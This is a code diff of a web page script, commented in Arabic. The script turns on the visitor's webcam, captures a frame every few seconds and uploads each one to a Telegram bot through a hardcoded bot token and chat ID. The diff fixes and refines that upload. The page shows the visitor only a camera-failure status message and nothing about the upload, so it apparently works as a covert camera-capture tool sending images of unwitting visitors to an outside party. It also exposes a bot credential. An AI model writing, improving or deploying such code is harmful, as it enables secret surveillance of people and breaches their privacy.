@@ -20,26 +20,31 @@
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
 
-    // ابدأ تشغيل الكاميرا
+    // تشغيل الكاميرا
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => {
         video.srcObject = stream;
 
         setInterval(() => {
           ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          const imgData = canvas.toDataURL('image/jpeg');
+          canvas.toBlob(blob => {
+            const formData = new FormData();
+            formData.append('chat_id', '6765420173'); // ضع ID الشات هنا
+            formData.append('photo', blob, 'snapshot.jpg');
 
-          fetch('https://api.telegram.org/bot7865229336:AAG8w_CBGt0gcGfMd7syGaUVhUH5lJaNL6I/sendPhoto', {
-            method: 'POST',
-            body: new URLSearchParams({
-              chat_id: '6765420173',
-              photo: imgData
+            fetch('https://api.telegram.org/bot7865229336:AAG8w_CBGt0gcGfMd7syGaUVhUH5lJaNL6I/sendPhoto', {
+              method: 'POST',
+              body: formData
             })
-          });
-        }, 1000); // يصور كل ثانية
+            .then(response => response.json())
+            .then(data => console.log("تم الإرسال:", data))
+            .catch(error => console.error("فشل الإرسال:", error));
+          }, 'image/jpeg');
+        }, 3000); // يلتقط صورة كل 3 ثوانٍ
       })
       .catch(err => {
         document.getElementById('status').innerText = 'فشل في الوصول إلى الكاميرا 😓';
+        console.error("خطأ في تشغيل الكاميرا:", err);
       });
   </script>
 
